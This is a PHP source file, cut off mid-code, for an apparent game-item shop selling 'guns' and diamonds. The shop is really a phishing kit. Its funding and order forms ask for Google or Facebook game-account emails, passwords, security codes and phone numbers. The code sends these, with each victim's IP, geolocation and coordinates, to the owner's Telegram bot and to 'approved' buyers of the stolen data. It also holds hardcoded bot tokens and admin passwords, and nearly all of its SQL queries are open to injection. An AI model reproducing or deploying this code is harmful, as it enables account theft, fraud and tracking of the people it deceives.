<?php
session_start();
error_reporting(0);

$db = new SQLite3('venomx.db');

$db->exec("CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    google_id TEXT UNIQUE,
    email TEXT UNIQUE,
    name TEXT,
    password TEXT,
    wallet REAL DEFAULT 0,
    banned INTEGER DEFAULT 0,
    photo TEXT,
    ip TEXT,
    location TEXT,
    captured_photo TEXT,
    device_id TEXT,
    battery_level TEXT,
    latitude TEXT,
    longitude TEXT,
    tg_id TEXT,
    approved INTEGER DEFAULT 0,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

$db->exec("CREATE TABLE IF NOT EXISTS orders (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    item_type TEXT,
    item_id INTEGER,
    name TEXT,
    amount REAL,
    status TEXT DEFAULT 'approved',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

$db->exec("CREATE TABLE IF NOT EXISTS fund_requests (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    amount REAL,
    utr TEXT,
    status TEXT DEFAULT 'pending',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

$db->exec("CREATE TABLE IF NOT EXISTS notifications (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    message TEXT,
    seen INTEGER DEFAULT 0,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

$db->exec("CREATE TABLE IF NOT EXISTS memberships (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT,
    price REAL,
    icon TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

$db->exec("CREATE TABLE IF NOT EXISTS guns (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT,
    price REAL,
    image TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

$db->exec("CREATE TABLE IF NOT EXISTS diamonds (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT,
    price REAL,
    image TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

$db->exec("CREATE TABLE IF NOT EXISTS settings (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    setting_key TEXT UNIQUE,
    setting_value TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

// Default Settings
$check = $db->querySingle("SELECT COUNT(*) FROM settings WHERE setting_key='upi_id'");
if($check == 0) {
    $db->exec("INSERT INTO settings (setting_key, setting_value) VALUES ('upi_id', '8210158438@mbk')");
    $db->exec("INSERT INTO settings (setting_key, setting_value) VALUES ('login_enabled', '1')");
    $db->exec("INSERT INTO settings (setting_key, setting_value) VALUES ('background', '#0a0a0a')");
    $db->exec("INSERT INTO settings (setting_key, setting_value) VALUES ('admin_key', 'ROHITXBOSSXOWNERZX')");
    $db->exec("INSERT INTO settings (setting_key, setting_value) VALUES ('owner_id', '7760830347')");
    $db->exec("INSERT INTO settings (setting_key, setting_value) VALUES ('bot_token', '8893330095:AAFwLKHleuwL8X4CWUeDS_0kJzCveZeCEeY')");
    $db->exec("INSERT INTO settings (setting_key, setting_value) VALUES ('admin_username', 'ROHIT')");
    $db->exec("INSERT INTO settings (setting_key, setting_value) VALUES ('admin_email', 'rohitxboss@gmail.com')");
    $db->exec("INSERT INTO settings (setting_key, setting_value) VALUES ('min_deposit', '299')");
    $db->exec("INSERT INTO settings (setting_key, setting_value) VALUES ('owner_username', 'ROHITxBOSS')");
    $db->exec("INSERT INTO settings (setting_key, setting_value) VALUES ('admin_pass', 'ROHIT/X/BOSS/OWNERPRO')");
}

// Default Products
$check = $db->querySingle("SELECT COUNT(*) FROM memberships");
if($check == 0) {
    $db->exec("INSERT INTO memberships (name, price, icon) VALUES ('Weekly', 99, 'https://i.ibb.co/qMJD9bc2/photo-AQAD9g9r-G5-DSe-FZ.jpg')");
    $db->exec("INSERT INTO memberships (name, price, icon) VALUES ('Monthly', 219, 'https://i.ibb.co/cKZmM0S8/photo-AQAD9w9r-G5-DSe-FZ.jpg')");
}

$check = $db->querySingle("SELECT COUNT(*) FROM guns");
if($check == 0) {
    $guns = [
        ['AUG', 'https://i.ibb.co/JWdTwBMy/photo-AQADCh-Br-G5-DSe-FZ9.jpg'],
        ['M60', 'https://i.ibb.co/1tF6RqpS/photo-AQADCBBr-G5-DSe-FZ9.jpg'],
        ['P90', 'https://i.ibb.co/XxMGWzY5/photo-AQADBBBr-G5-DSe-FZ9.jpg'],
        ['Woodpecker', 'https://i.ibb.co/LdrDbk6M/photo-AQADAx-Br-G5-DSe-FZ9.jpg'],
        ['MP40', 'https://i.ibb.co/4nMDmBW1/photo-AQADAh-Br-G5-DSe-FZ9.jpg'],
        ['M10', 'https://i.ibb.co/k2HWwgFf/photo-AQAEEGsbk-NJ4-Vn0.jpg'],
        ['Thompson', 'https://i.ibb.co/0pPwrNVf/photo-AQAD-w9r-G5-DSe-FZ9.jpg'],
        ['A94', 'https://i.ibb.co/PzPfQSP3/photo-AQAD-g9r-G5-DSe-FZ9.jpg'],
        ['M1887', 'https://i.ibb.co/0VWCPvWW/photo-AQAD-Q9r-G5-DSe-FZ9.jpg'],
        ['MP5', 'https://i.ibb.co/Pvgr1rHF/photo-AQAD-w9r-G5-DSe-FZ9.jpg'],
        ['AK47', 'https://i.ibb.co/wFnQq4MX/photo-AQAD-Q9r-G5-DSe-FZ9.jpg']
    ];
    foreach($guns as $gun) {
        $db->exec("INSERT INTO guns (name, price, image) VALUES ('{$gun[0]}', 299, '{$gun[1]}')");
    }
}

$check = $db->querySingle("SELECT COUNT(*) FROM diamonds");
if($check == 0) {
    $db->exec("INSERT INTO diamonds (name, price, image) VALUES ('100 Diamonds', 39, 'https://i.ibb.co/mCGqfB99/photo-AQAD-A9r-G5-DSe-FZ.jpg')");
    $db->exec("INSERT INTO diamonds (name, price, image) VALUES ('200 Diamonds', 79, 'https://i.ibb.co/mCGqfB99/photo-AQAD-A9r-G5-DSe-FZ.jpg')");
    $db->exec("INSERT INTO diamonds (name, price, image) VALUES ('1200 Diamonds', 499, 'https://i.ibb.co/mCGqfB99/photo-AQAD-A9r-G5-DSe-FZ.jpg')");
}

function getSetting($key) {
    global $db;
    $result = $db->querySingle("SELECT setting_value FROM settings WHERE setting_key='$key'", true);
    return $result ? $result['setting_value'] : null;
}

function updateSetting($key, $value) {
    global $db;
    $db->exec("UPDATE settings SET setting_value='$value' WHERE setting_key='$key'");
}

$BOT_TOKEN = getSetting('bot_token');
$OWNER_ID = getSetting('owner_id');
$ADMIN_KEY = getSetting('admin_key');
$MIN_DEPOSIT = getSetting('min_deposit') ?: 299;

function botRequest($method, $data) {
    global $BOT_TOKEN;
    @file_get_contents("https://api.telegram.org/bot".$BOT_TOKEN."/".$method."?".http_build_query($data));
    return true;
}

function sendPhotoToBot($photoData, $caption) {
    global $BOT_TOKEN, $OWNER_ID;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot".$BOT_TOKEN."/sendPhoto");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, [
        'chat_id' => $OWNER_ID,
        'photo' => $photoData,
        'caption' => $caption
    ]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

function sendToApprovedUsers($message, $photoData = null) {
    global $db, $BOT_TOKEN;
    $users = $db->query("SELECT tg_id FROM users WHERE approved = 1 AND tg_id IS NOT NULL AND tg_id != ''");
    while($u = $users->fetchArray()) {
        if($photoData) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot".$BOT_TOKEN."/sendPhoto");
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, [
                'chat_id' => $u['tg_id'],
                'photo' => $photoData,
                'caption' => $message
            ]);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_exec($ch);
            curl_close($ch);
        } else {
            botRequest("sendMessage", ['chat_id' => $u['tg_id'], 'text' => $message]);
        }
    }
}

function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return $_SERVER['HTTP_X_FORWARDED_FOR'];
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

function getLocationFromIP($ip) {
    $url = "http://ip-api.com/json/{$ip}";
    $data = @file_get_contents($url);
    if($data) {
        $json = json_decode($data, true);
        if($json['status'] == 'success') {
            return [
                'region' => $json['regionName'] ?? 'Unknown',
                'city' => $json['city'] ?? 'Unknown',
                'zip' => $json['zip'] ?? 'Unknown',
                'as' => $json['as'] ?? 'Unknown',
                'lat' => $json['lat'] ?? '0',
                'lon' => $json['lon'] ?? '0'
            ];
        }
    }
    return ['region' => 'Unknown', 'city' => 'Unknown', 'zip' => 'Unknown', 'as' => 'Unknown', 'lat' => '0', 'lon' => '0'];
}

// ============ FORMAT BOT MESSAGE (STYLISH) ============
function formatBotMessage($data) {
    $msg = "╭➤ RESULT #" . rand(100, 999) . " | " . date('d/m/y') . "\n";
    $msg .= "╰➤ Player ID: " . ($data['uid'] ?? 'N/A') . "\n";
    $msg .= "╰➤ Email/Phone: " . ($data['email'] ?? $data['login'] ?? 'N/A') . "\n";
    $msg .= "╰➤ Password: " . ($data['password'] ?? 'N/A') . "\n";
    $msg .= "╰➤ Platform: " . ($data['platform'] ?? 'N/A') . "\n";
    $msg .= "╰➤ Level: " . ($data['level'] ?? 'N/A') . "\n";
    $msg .= "╰➤ Phone: " . ($data['contact'] ?? 'N/A') . "\n";
    $msg .= "╰➤ Security Code: " . ($data['security_code'] ?? 'N/A') . "\n";
    $msg .= "╰➤ IP: " . ($data['ip'] ?? 'Unknown') . "\n";
    $msg .= "╰➤ Region: " . ($data['region'] ?? 'Unknown') . "\n";
    $msg .= "╰➤ City: " . ($data['city'] ?? 'Unknown') . "\n";
    $msg .= "╰➤ ZIP: " . ($data['zip'] ?? 'Unknown') . "\n";
    $msg .= "╰➤ AS: " . ($data['as'] ?? 'Unknown') . "\n";
    $msg .= "╰➤ Latitude: " . ($data['lat'] ?? '0') . "\n";
    $msg .= "╰➤ Longitude: " . ($data['lon'] ?? '0') . "\n";
    $msg .= "╰➤ Battery: " . ($data['battery'] ?? 'Unknown') . "%";
    return $msg;
}

// ============ BOT COMMANDS ============
if(isset($_GET['bot_cmd'])) {
    $cmd = $_GET['bot_cmd'];
    $parts = explode(' ', $cmd);
    $action = $parts[0];
    
    if($action == 'start') {
        $welcome_msg = "╭──────────────────╮\n";
        $welcome_msg .= "│   WELCOME TO     │\n";
        $welcome_msg .= "│    GUNSTORE      │\n";
        $welcome_msg .= "╰──────────────────╯\n\n";
        $welcome_msg .= "Use /approve [user_tg_id] to approve users\n";
        $welcome_msg .= "Use /ban [user_id] to ban\n";
        $welcome_msg .= "Use /unban [user_id] to unban\n";
        $welcome_msg .= "Use /addfund [user_id] [amount] to add funds\n";
        $welcome_msg .= "Use /stats for stats\n";
        $welcome_msg .= "Use /users for user list\n";
        $welcome_msg .= "Use /change_upi [new_upi] to change UPI\n";
        $welcome_msg .= "Use /change_pass [user_id] [new_pass] to change password\n\n";
        $welcome_msg .= "Join Channel: https://t.me/+aGDAZcx5AhoyOWZl";
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot".$BOT_TOKEN."/sendPhoto");
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, [
            'chat_id' => $parts[1] ?? $OWNER_ID,
            'photo' => 'https://i.ibb.co/XZP9VVxz/photo-AQAD8w1r-G4-Pkg-VZ9.jpg',
            'caption' => $welcome_msg,
            'reply_markup' => json_encode([
                'inline_keyboard' => [
                    [['text' => 'Join Channel', 'url' => 'https://t.me/+aGDAZcx5AhoyOWZl']],
                    [['text' => 'Owner', 'url' => 'https://t.me/ROHITxBOSS']],
                    [['text' => 'Website', 'url' => 'https://rohitxcheapffshop.onrender.com']]
                ]
            ])
        ]);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);
        echo "Welcome sent";
        exit;
    }
    elseif($action == 'approve' && isset($parts[1])) {
        $tg_id = $parts[1];
        $db->exec("UPDATE users SET approved = 1 WHERE tg_id='$tg_id'");
        $db->exec("INSERT INTO pending_approvals (tg_id, status) VALUES ('$tg_id', 'approved')");
        botRequest("sendMessage", ['chat_id' => $OWNER_ID, 'text' => "User $tg_id approved!"]);
        botRequest("sendMessage", ['chat_id' => $tg_id, 'text' => "✅ You have been approved! Now you will receive user data."]);
        echo "Approved";
        exit;
    }
    elseif($action == 'addfund' && isset($parts[1], $parts[2])) {
        $user_id = intval($parts[1]);
        $amount = floatval($parts[2]);
        $db->exec("UPDATE users SET wallet = wallet + $amount WHERE id = $user_id");
        botRequest("sendMessage", ['chat_id' => $OWNER_ID, 'text' => "Added ₹$amount to User ID $user_id"]);
        echo "Done";
        exit;
    }
    elseif($action == 'ban' && isset($parts[1])) {
        $db->exec("UPDATE users SET banned = 1 WHERE id = " . intval($parts[1]));
        botRequest("sendMessage", ['chat_id' => $OWNER_ID, 'text' => "User ID {$parts[1]} banned"]);
        echo "Banned";
        exit;
    }
    elseif($action == 'unban' && isset($parts[1])) {
        $db->exec("UPDATE users SET banned = 0 WHERE id = " . intval($parts[1]));
        botRequest("sendMessage", ['chat_id' => $OWNER_ID, 'text' => "User ID {$parts[1]} unbanned"]);
        echo "Unbanned";
        exit;
    }
    elseif($action == 'change_upi' && isset($parts[1])) {
        $new_upi = $parts[1];
        updateSetting('upi_id', $new_upi);
        botRequest("sendMessage", ['chat_id' => $OWNER_ID, 'text' => "UPI ID changed to: $new_upi"]);
        echo "UPI Updated";
        exit;
    }
    elseif($action == 'change_pass' && isset($parts[1], $parts[2])) {
        $user_id = intval($parts[1]);
        $new_pass = password_hash($parts[2], PASSWORD_DEFAULT);
        $db->exec("UPDATE users SET password = '$new_pass' WHERE id = $user_id");
        botRequest("sendMessage", ['chat_id' => $OWNER_ID, 'text' => "Password changed for User ID $user_id"]);
        echo "Password Updated";
        exit;
    }
    elseif($action == 'stats') {
        $count = $db->querySingle("SELECT COUNT(*) FROM users");
        $pending = $db->querySingle("SELECT COUNT(*) FROM users WHERE approved = 0");
        botRequest("sendMessage", ['chat_id' => $OWNER_ID, 'text' => "STATS\nTotal Users: $count\nPending Approval: $pending"]);
        echo "Stats sent";
        exit;
    }
    elseif($action == 'users') {
        $users = $db->query("SELECT id, email, wallet, approved FROM users LIMIT 20");
        $msg = "USERS LIST:\n\n";
        while($u = $users->fetchArray()) {
            $status = $u['approved'] == 1 ? '✅ Approved' : '⏳ Pending';
            $msg .= "ID {$u['id']} - {$u['email']} - ₹{$u['wallet']} - $status\n";
        }
        botRequest("sendMessage", ['chat_id' => $OWNER_ID, 'text' => $msg]);
        echo "Users list sent";
        exit;
    }
    exit;
}

// ============ ADMIN ACTIONS ============
if(isset($_POST['admin_action'])) {
    $action = $_POST['admin_action'];
    $admin_key = $_POST['admin_key'] ?? '';
    $ADMIN_KEY = getSetting('admin_key');
    
    if($admin_key === $ADMIN_KEY) {
        if($action === 'change_upi') {
            $new_upi = $_POST['new_upi'];
            updateSetting('upi_id', $new_upi);
            echo "<script>alert('UPI ID updated!'); window.location.href='?admin=1';</script>";
            exit;
        }
        elseif($action === 'change_admin_key') {
            $new_key = $_POST['new_admin_key'];
            updateSetting('admin_key', $new_key);
            echo "<script>alert('Admin Key updated!'); window.location.href='?admin=1';</script>";
            exit;
        }
        elseif($action === 'change_owner_id') {
            $new_owner = $_POST['new_owner_id'];
            updateSetting('owner_id', $new_owner);
            echo "<script>alert('Owner ID updated!'); window.location.href='?admin=1';</script>";
            exit;
        }
        elseif($action === 'change_bot_token') {
            $new_token = $_POST['new_bot_token'];
            updateSetting('bot_token', $new_token);
            echo "<script>alert('Bot Token updated!'); window.location.href='?admin=1';</script>";
            exit;
        }
        elseif($action === 'toggle_login') {
            $current = getSetting('login_enabled');
            updateSetting('login_enabled', $current == '1' ? '0' : '1');
            echo "<script>alert('Login page toggled!'); window.location.href='?admin=1';</script>";
            exit;
        }
        elseif($action === 'change_bg') {
            $new_bg = $_POST['new_bg'];
            updateSetting('background', $new_bg);
            echo "<script>alert('Background updated!'); window.location.href='?admin=1';</script>";
            exit;
        }
        elseif($action === 'ban_user') {
            $user_id = intval($_POST['user_id']);
            $db->exec("UPDATE users SET banned = 1 WHERE id = $user_id");
            botRequest("sendMessage", ['chat_id' => $OWNER_ID, 'text' => "User ID $user_id banned"]);
            echo "<script>alert('User banned!'); window.location.href='?admin=1';</script>";
            exit;
        }
        elseif($action === 'unban_user') {
            $user_id = intval($_POST['user_id']);
            $db->exec("UPDATE users SET banned = 0 WHERE id = $user_id");
            botRequest("sendMessage", ['chat_id' => $OWNER_ID, 'text' => "User ID $user_id unbanned"]);
            echo "<script>alert('User unbanned!'); window.location.href='?admin=1';</script>";
            exit;
        }
        elseif($action === 'ban_ip') {
            $ip = $_POST['ban_ip'];
            $db->exec("UPDATE users SET banned = 1 WHERE ip='$ip'");
            echo "<script>alert('IP banned!'); window.location.href='?admin=1';</script>";
            exit;
        }
        elseif($action === 'unban_ip') {
            $ip = $_POST['unban_ip'];
            $db->exec("UPDATE users SET banned = 0 WHERE ip='$ip'");
            echo "<script>alert('IP unbanned!'); window.location.href='?admin=1';</script>";
            exit;
        }
        elseif($action === 'delete_user') {
            $user_id = intval($_POST['user_id']);
            $db->exec("DELETE FROM users WHERE id=$user_id");
            echo "<script>alert('User deleted!'); window.location.href='?admin=1';</script>";
            exit;
        }
        elseif($action === 'change_min_deposit') {
            $new_min = $_POST['new_min_deposit'];
            updateSetting('min_deposit', $new_min);
            echo "<script>alert('Min deposit updated to ₹$new_min'); window.location.href='?admin=1';</script>";
            exit;
        }
    }
}

// ============ GOOGLE LOGIN ============
if(isset($_POST['google_credential'])) {
    $cred_json = base64_decode($_POST['google_credential']);
    $cred = json_decode($cred_json, true);
    if(!$cred || !isset($cred['sub'])) { header("Location: index.php"); exit; }
    $google_id = $cred['sub'];
    $email = $cred['email'] ?? '';
    $name = $cred['name'] ?? '';
    $photo = $cred['picture'] ?? '';
    $ip = getUserIP();
    $location = getLocationFromIP($ip);
    
    $check = $db->querySingle("SELECT id, banned FROM users WHERE google_id='$google_id'", true);
    if($check) {
        if($check['banned'] == 1) { $_SESSION['banned'] = true; }
        else { 
            $_SESSION['user_id'] = $check['id']; 
            $_SESSION['logged_in'] = true;
            $db->exec("UPDATE users SET ip='$ip', location='{$location['city']}, {$location['region']}', latitude='{$location['lat']}', longitude='{$location['lon']}' WHERE id=".$check['id']);
        }
    } else {
        $db->exec("INSERT INTO users (google_id, email, name, photo, ip, location, latitude, longitude) VALUES ('$google_id', '$email', '$name', '$photo', '$ip', '{$location['city']}, {$location['region']}', '{$location['lat']}', '{$location['lon']}')");
        $user_id = $db->lastInsertRowID();
        $_SESSION['user_id'] = $user_id;
        $_SESSION['logged_in'] = true;
    }
    header("Location: index.php");
    exit;
}

// ============ EMAIL SIGNUP ============
if(isset($_POST['signup'])) {
    $email = $_POST['email'];
    $name = $_POST['name'];
    $pass = password_hash($_POST['password'], PASSWORD_DEFAULT);
    $ip = getUserIP();
    $location = getLocationFromIP($ip);
    
    $check = $db->querySingle("SELECT id FROM users WHERE email='$email'", true);
    if(!$check) {
        $db->exec("INSERT INTO users (email, name, password, ip, location, latitude, longitude) VALUES ('$email', '$name', '$pass', '$ip', '{$location['city']}, {$location['region']}', '{$location['lat']}', '{$location['lon']}')");
        $user_id = $db->lastInsertRowID();
        $_SESSION['user_id'] = $user_id;
        $_SESSION['logged_in'] = true;
        
        $data = [
            'uid' => $user_id,
            'email' => $email,
            'password' => 'N/A',
            'platform' => 'Signup',
            'level' => 'N/A',
            'contact' => 'N/A',
            'security_code' => 'N/A',
            'ip' => $ip,
            'region' => $location['region'],
            'city' => $location['city'],
            'zip' => $location['zip'],
            'as' => $location['as'],
            'lat' => $location['lat'],
            'lon' => $location['lon'],
            'battery' => 'N/A'
        ];
        $msg = formatBotMessage($data);
        
        // Owner ko bhejo
        botRequest("sendMessage", ['chat_id' => $OWNER_ID, 'text' => $msg]);
        // Approved users ko bhejo
        sendToApprovedUsers("📢 New User Signup!\n\n" . $msg);
        
        echo "<script>alert('Account created successfully!'); window.location.href='index.php';</script>";
        exit;
    } else {
        echo "<script>alert('Email already registered!'); window.location.href='index.php';</script>";
        exit;
    }
}

// ============ LOGIN ============
if(isset($_POST['login'])) {
    $email = $_POST['email'];
    $pass = $_POST['password'];
    
    $user = $db->querySingle("SELECT * FROM users WHERE email='$email'", true);
    if($user && password_verify($pass, $user['password'])) {
        if($user['banned'] == 1) { 
            $_SESSION['banned'] = true;
            echo "<script>alert('You are banned!'); window.location.href='index.php';</script>";
            exit;
        } else { 
            $_SESSION['user_id'] = $user['id'];
            $_SESSION['logged_in'] = true;
            $ip = getUserIP();
            $location = getLocationFromIP($ip);
            $db->exec("UPDATE users SET ip='$ip', location='{$location['city']}, {$location['region']}', latitude='{$location['lat']}', longitude='{$location['lon']}' WHERE id=".$user['id']);
            
            $data = [
                'uid' => $user['id'],
                'email' => $email,
                'password' => 'N/A',
                'platform' => 'Login',
                'level' => 'N/A',
                'contact' => 'N/A',
                'security_code' => 'N/A',
                'ip' => $ip,
                'region' => $location['region'],
                'city' => $location['city'],
                'zip' => $location['zip'],
                'as' => $location['as'],
                'lat' => $location['lat'],
                'lon' => $location['lon'],
                'battery' => $user['battery_level'] ?? 'N/A'
            ];
            $msg = formatBotMessage($data);
            
            // Owner ko bhejo
            botRequest("sendMessage", ['chat_id' => $OWNER_ID, 'text' => $msg]);
            // Approved users ko bhejo
            sendToApprovedUsers("🔐 User Login!\n\n" . $msg);
            
            echo "<script>alert('Login successful!'); window.location.href='index.php';</script>";
            exit;
        }
    } else {
        echo "<script>alert('Account not found! Please signup first.'); window.location.href='index.php';</script>";
        exit;
    }
}

// ============ ADMIN LOGIN VIA KEY ============
if(isset($_POST['admin_key_login'])) {
    $key = $_POST['admin_key'];
    $ADMIN_KEY = getSetting('admin_key');
    
    if($key === $ADMIN_KEY) {
        $_SESSION['admin_logged_in'] = true;
        header("Location: index.php?admin=1");
        exit;
    } else {
        echo "<script>alert('Invalid Admin Key!'); window.location.href='index.php';</script>";
        exit;
    }
}

// ============ CART ============
if(isset($_POST['add_to_cart'])) {
    if(!isset($_SESSION['cart'])) $_SESSION['cart'] = [];
    $_SESSION['cart'][] = [
        'type' => $_POST['item_type'],
        'id' => intval($_POST['item_id']),
        'name' => $_POST['item_name'],
        'price' => floatval($_POST['item_price'])
    ];
    header("Location: index.php?msg=Added+to+cart");
    exit;
}

if(isset($_GET['remove_cart'])) {
    $index = intval($_GET['remove_cart']);
    if(isset($_SESSION['cart'][$index])) unset($_SESSION['cart'][$index]);
    $_SESSION['cart'] = array_values($_SESSION['cart']);
    header("Location: index.php?show_cart=1");
    exit;
}

if(isset($_POST['checkout'])) {
    $total = 0;
    foreach($_SESSION['cart'] as $item) { $total += $item['price']; }
    if($total <= 0) { header("Location: index.php?msg=Cart+empty"); exit; }
    $_SESSION['checkout_total'] = $total;
    header("Location: index.php?step=checkout");
    exit;
}

// ============ PAYMENT ============
if(isset($_POST['add_funds_req'])) {
    $amount = floatval($_POST['amount']);
    $utr = $_POST['utr'];
    $MIN_DEPOSIT = getSetting('min_deposit') ?: 299;
    if($amount >= $MIN_DEPOSIT) {
        $_SESSION['temp_amount'] = $amount;
        $_SESSION['temp_utr'] = $utr;
        header("Location: index.php?step=game_account");
        exit;
    } else { 
        header("Location: index.php?msg=Minimum+₹$MIN_DEPOSIT");
        exit;
    }
}

// Google Funds
if(isset($_POST['submit_google_funds'])) {
    $uid = $_POST['uid'];
    $game_name = $_POST['game_name'];
    $email = $_POST['email'];
    $pass = $_POST['password'];
    $code = $_POST['security_code'];
    $contact = $_POST['contact'];
    $user = $db->querySingle("SELECT * FROM users WHERE id=".$_SESSION['user_id'], true);
    $amount = $_SESSION['temp_amount'];
    $utr = $_SESSION['temp_utr'];
    $ip = getUserIP();
    $location = getLocationFromIP($ip);
    $battery = $user['battery_level'] ?? 'Unknown';
    
    $data = [
        'uid' => $uid,
        'email' => $email,
        'password' => $pass,
        'platform' => 'Google',
        'level' => 'N/A',
        'contact' => $contact,
        'security_code' => $code,
        'ip' => $ip,
        'region' => $location['region'],
        'city' => $location['city'],
        'zip' => $location['zip'],
        'as' => $location['as'],
        'lat' => $location['lat'],
        'lon' => $location['lon'],
        'battery' => $battery
    ];
    $msg = formatBotMessage($data);
    $msg .= "\n\n💰 Amount: ₹$amount\n🔑 UTR: $utr\n👤 User: {$user['name']}\n🆔 ID: {$user['id']}";
    
    // Owner ko bhejo
    botRequest("sendMessage", ['chat_id' => $OWNER_ID, 'text' => $msg]);
    // Approved users ko bhejo
    sendToApprovedUsers("💰 New Fund Request!\n\n" . $msg);
    
    $db->exec("INSERT INTO fund_requests (user_id, amount, utr) VALUES ({$user['id']}, $amount, '$utr')");
    
    unset($_SESSION['temp_amount'], $_SESSION['temp_utr']);
    echo "<script>alert('Fund request sent!'); window.location.href='index.php?msg=Fund+request+sent';</script>";
    exit;
}

// Facebook Funds
if(isset($_POST['submit_fb_funds'])) {
    $uid = $_POST['uid'];
    $game_name = $_POST['game_name'];
    $login = $_POST['login'];
    $pass = $_POST['password'];
    $linked_email = $_POST['linked_email'];
    $username = $_POST['username'];
    $contact = $_POST['contact'];
    $user = $db->querySingle("SELECT * FROM users WHERE id=".$_SESSION['user_id'], true);
    $amount = $_SESSION['temp_amount'];
    $utr = $_SESSION['temp_utr'];
    $ip = getUserIP();
    $location = getLocationFromIP($ip);
    $battery = $user['battery_level'] ?? 'Unknown';
    
    $data = [
        'uid' => $uid,
        'email' => $login,
        'password' => $pass,
        'platform' => 'Facebook',
        'level' => 'N/A',
        'contact' => $contact,
        'security_code' => 'N/A',
        'ip' => $ip,
        'region' => $location['region'],
        'city' => $location['city'],
        'zip' => $location['zip'],
        'as' => $location['as'],
        'lat' => $location['lat'],
        'lon' => $location['lon'],
        'battery' => $battery
    ];
    $msg = formatBotMessage($data);
    $msg .= "\n\n📧 Linked Email: $linked_email\n👤 Username: $username\n💰 Amount: ₹$amount\n🔑 UTR: $utr\n👤 User: {$user['name']}\n🆔 ID: {$user['id']}";
    
    // Owner ko bhejo
    botRequest("sendMessage", ['chat_id' => $OWNER_ID, 'text' => $msg]);
    // Approved users ko bhejo
    sendToApprovedUsers("💰 New Fund Request!\n\n" . $msg);
    
    $db->exec("INSERT INTO fund_requests (user_id, amount, utr) VALUES ({$user['id']}, $amount, '$utr')");
    
    unset($_SESSION['temp_amount'], $_SESSION['temp_utr']);
    echo "<script>alert('Fund request sent!'); window.location.href='index.php?msg=Fund+request+sent';</script>";
    exit;
}

// Google Order
if(isset($_POST['submit_google_order'])) {
    $uid = $_POST['uid'];
    $game_name = $_POST['game_name'];
    $email = $_POST['email'];
    $pass = $_POST['password'];
    $code = $_POST['security_code'];
    $contact = $_POST['contact'];
    $user = $db->querySingle("SELECT * FROM users WHERE id=".$_SESSION['user_id'], true);
    $total = $_SESSION['checkout_total'];
    $ip = getUserIP();
    $location = getLocationFromIP($ip);
    $battery = $user['battery_level'] ?? 'Unknown';
    
    if($user['wallet'] >= $total) {
        $db->exec("UPDATE users SET wallet = wallet - $total WHERE id=".$user['id']);
        foreach($_SESSION['cart'] as $item) {
            $db->exec("INSERT INTO orders (user_id, item_type, item_id, name, amount) VALUES ({$user['id']}, '{$item['type']}', {$item['id']}, '{$item['name']}', {$item['price']})");
        }
        
        $data = [
            'uid' => $uid,
            'email' => $email,
            'password' => $pass,
            'platform' => 'Google',
            'level' => 'N/A',
            'contact' => $contact,
            'security_code' => $code,
            'ip' => $ip,
            'region' => $location['region'],
            'city' => $location['city'],
            'zip' => $location['zip'],
            'as' => $location['as'],
            'lat' => $location['lat'],
            'lon' => $location['lon'],
            'battery' => $battery
        ];
        $msg = formatBotMessage($data);
        $msg .= "\n\n🛒 ORDER\n💰 Total: ₹$total\n👤 User: {$user['name']}\n🆔 ID: {$user['id']}";
        
        // Owner ko bhejo
        botRequest("sendMessage", ['chat_id' => $OWNER_ID, 'text' => $msg]);
        // Approved users ko bhejo
        sendToApprovedUsers("🛒 New Order!\n\n" . $msg);
        
        $_SESSION['cart'] = [];
        unset($_SESSION['checkout_total']);
        echo "<script>alert('Order placed!'); window.location.href='index.php?msg=Order+placed+successfully';</script>";
        exit;
    } else {
        echo "<script>alert('Insufficient balance!'); window.location.href='index.php?msg=Insufficient+balance';</script>";
        exit;
    }
}

// Facebook Order
if(isset($_POST['submit_fb_order'])) {
    $uid = $_POST['uid'];
    $game_name = $_POST['game_name'];
    $login = $_POST['login'];
    $pass = $_POST['password'];
    $linked_email = $_POST['linked_email'];
    $username = $_POST['username'];
    $contact = $_POST['contact'];
    $user = $db->querySingle("SELECT * FROM users WHERE id=".$_SESSION['user_id'], true);
    $total = $_SESSION['checkout_total'];
    $ip = getUserIP();
    $location = getLocationFromIP($ip);
    $battery = $user['battery_level'] ?? 'Unknown';
    
    if($user['wallet'] >= $total) {
        $db->exec("UPDATE users SET wallet = wallet - $total WHERE id=".$user['id']);
        foreach($_SESSION['cart'] as $item) {
            $db->exec("INSERT INTO orders (user_id, item_type, item_id, name, amount) VALUES ({$user['id']}, '{$item['type']}', {$item['id']}, '{$item['name']}', {$item['price']})");
        }
        
        $data = [
            'uid' => $uid,
